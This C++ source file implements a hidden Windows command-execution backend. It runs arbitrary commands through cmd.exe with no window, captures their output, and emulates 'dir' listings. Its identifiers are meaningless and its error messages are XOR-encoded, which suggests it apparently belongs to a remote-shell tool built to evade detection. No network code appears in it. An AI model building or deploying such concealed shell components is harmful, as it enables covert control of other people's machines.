#include "kz.h"
#include "mt.h"

static string zA0(const string& s) {
    size_t start = 0;
    while (start < s.size() && isspace((unsigned char)s[start])) start++;
    size_t end = s.size();
    while (end > start && isspace((unsigned char)s[end - 1])) end--;
    return s.substr(start, end - start);
}

static string zF0(const string& s) {
    string out = s;
    while (!out.empty() && (out.back() == '\n' || out.back() == '\r' || out.back() == ' ' || out.back() == '\t')) {
        out.pop_back();
    }
    return out;
}

static bool zG0(const string& s) {
    int expected = 0;
    for (unsigned char c : s) {
        if (expected == 0) {
            if ((c >> 7) == 0) continue;
            if ((c >> 5) == 0x6) expected = 1;
            else if ((c >> 4) == 0xE) expected = 2;
            else if ((c >> 3) == 0x1E) expected = 3;
            else return false;
        } else {
            if ((c >> 6) != 0x2) return false;
            expected--;
        }
    }
    return expected == 0;
}

static string zH0(const string& s) {
    return zA0(s);
}

static bool zI0(const string& s, const string& prefix) {
    if (s.size() < prefix.size()) return false;
    for (size_t i = 0; i < prefix.size(); ++i) {
        if (tolower((unsigned char)s[i]) != tolower((unsigned char)prefix[i])) return false;
    }
    return true;
}

static string zJ0(const string& cmd) {
    string trimmed = zH0(cmd);
    if (!zI0(trimmed, "dir")) return cmd;
    if (trimmed.size() > 3 && !isspace((unsigned char)trimmed[3])) return cmd;

    string lower = trimmed;
    transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c) { return (char)tolower(c); });

    if (lower.find("/b") != string::npos || lower.find("/w") != string::npos || lower.find("/x") != string::npos) {
        return cmd;
    }

    if (lower.find("/n") == string::npos) trimmed += " /n";
    if (lower.find("/-c") == string::npos) trimmed += " /-c";
    if (lower.find("/a") == string::npos) trimmed += " /a";
    if (lower.find("/o:") == string::npos && lower.find("/o-") == string::npos) trimmed += " /o:n";
    return trimmed;
}

static bool zK0(const string& cmd) {
    string trimmed = zH0(cmd);
    if (!zI0(trimmed, "dir")) return false;
    if (trimmed.size() > 3 && !isspace((unsigned char)trimmed[3])) return false;
    return trimmed.find('|') == string::npos
        && trimmed.find('>') == string::npos
        && trimmed.find('<') == string::npos
        && trimmed.find('&') == string::npos;
}

static string zL0(const string& cmd) {
    string trimmed = zH0(cmd);
    string args = trimmed.size() > 3 ? zA0(trimmed.substr(3)) : "";
    if (args.empty()) return ".";

    string path;
    bool inQuote = false;
    for (size_t i = 0; i < args.size(); ++i) {
        char c = args[i];
        if (c == '"') {
            inQuote = !inQuote;
            continue;
        }
        if (!inQuote && c == '/') break;
        path += c;
    }
    path = zA0(path);
    if (path.empty()) return ".";
    return path;
}

static string zM0(const string& path) {
    namespace fs = std::filesystem;
    fs::path fp(yB(path));
    error_code ec;
    if (!fs::exists(fp, ec)) {
        return "找不到路径: " + path;
    }
    if (!fs::is_directory(fp, ec)) {
        return "不是目录: " + path;
    }

    vector<fs::directory_entry> entries;
    for (const auto& entry : fs::directory_iterator(fp, ec)) {
        if (ec) break;
        entries.push_back(entry);
    }
    sort(entries.begin(), entries.end(), [](const fs::directory_entry& a, const fs::directory_entry& b) {
        return a.path().filename().wstring() < b.path().filename().wstring();
    });

    string out = " " + path + " 的目录\n\n";
    for (const auto& entry : entries) {
        error_code ec2;
        auto ftime = entry.last_write_time(ec2);
        time_t t = 0;
        if (!ec2) {
            auto dur = ftime.time_since_epoch();
            auto sec = chrono::duration_cast<chrono::seconds>(dur);
            t = sec.count() - 11644473600LL;
        }
        struct tm tmv = {};
        localtime_s(&tmv, &t);
        char tb[32] = {};
        strftime(tb, sizeof(tb), "%Y/%m/%d  %H:%M", &tmv);

        string name = yC(entry.path().filename().wstring());
        if (entry.is_directory(ec2)) {
            out += string(tb) + "    <DIR>          " + name + "\n";
        } else {
            uintmax_t sz = entry.file_size(ec2);
            char sb[32];
            sprintf_s(sb, "%14llu", (unsigned long long)sz);
            out += string(tb) + " " + sb + " " + name + "\n";
        }
    }
    return zF0(out);
}

zE::zE() : hRead(NULL), hWrite(NULL), seq(0), alive(false) {
    memset(&pi, 0, sizeof(pi));
}

zE::~zE() {
    if (pi.hProcess) { TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); }
    if (pi.hThread) CloseHandle(pi.hThread);
    if (hRead) CloseHandle(hRead);
    if (hWrite) CloseHandle(hWrite);
}

bool zE::Start() {
    alive = true;
    return true;
}

string zE::Execute(const string& cmd) {
    if (!alive && !Start()) return __o("\x30\x27\x27\x3a\x27\x6f\x75\x26\x3d\x30\x39\x39\x75\x3b\x3a\x21\x75\x34\x23\x34\x3c\x39\x34\x37\x39\x30",26);
    string realCmd = zJ0(cmd);

    HANDLE hStdoutRead = NULL, hStdoutWrite = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        return __o("\x30\x27\x27\x3a\x27\x6f\x75\x26\x3d\x30\x39\x39\x75\x3b\x3a\x21\x75\x34\x23\x34\x3c\x39\x34\x37\x39\x30",26);
    }
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    wstring cmdline = L"cmd.exe /A /Q /D /S /C \"" + yB(realCmd) + L"\"";
    PROCESS_INFORMATION localPi;
    memset(&localPi, 0, sizeof(localPi));
    if (!CreateProcessW(NULL, &cmdline[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &localPi)) {
        CloseHandle(hStdoutRead);
        CloseHandle(hStdoutWrite);
        return __o("\x30\x27\x27\x3a\x27\x6f\x75\x22\x27\x3c\x21\x30\x75\x21\x3a\x75\x26\x3d\x30\x39\x39\x75\x33\x34\x3c\x39\x30\x31",28);
    }
    CloseHandle(hStdoutWrite);

    string output;
    char buf[16384];
    DWORD n = 0, avail = 0;
    int totalMs = 0;
    bool finished = false;
    while (totalMs < 15000 || !finished) {
        if (PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            ReadFile(hStdoutRead, buf, min((DWORD)sizeof(buf) - 1, avail), &n, NULL);
            if (n > 0) { buf[n] = '\0'; output += buf; }
        }
        DWORD wr = WaitForSingleObject(localPi.hProcess, 50);
        if (wr == WAIT_OBJECT_0) {
            finished = true;
            if (!(PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &avail, NULL) && avail > 0)) {
                break;
            }
        }
        if (!finished) totalMs += 50;
        if (finished && totalMs >= 15000 && !(PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &avail, NULL) && avail > 0)) {
            break;
        }
    }
    if (!finished) {
        output += "\n[timeout]";
        TerminateProcess(localPi.hProcess, 1);
    }
    CloseHandle(localPi.hProcess);
    CloseHandle(localPi.hThread);
    CloseHandle(hStdoutRead);
    return output;
}

zE yQ;

string yU(const string& cmd) {
    if (zK0(cmd)) {
        return zM0(zL0(cmd));
    }
    string result = yQ.Execute(cmd);
    if (result.empty()) result = __o("\x7d\x3b\x3a\x75\x3a\x20\x21\x25\x20\x21\x7c",11);
    else {
        string clean;
        istringstream stream(result);
        string line;
        while (getline(stream, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();
            if (!clean.empty()) clean += "\n";
            clean += line;
        }
        if (clean.empty()) clean = __o("\x7d\x3b\x3a\x75\x3a\x20\x21\x25\x20\x21\x7c",11);
        clean = zF0(clean);
        result = zG0(clean) ? clean : yA(clean);
    }
    return result;
}
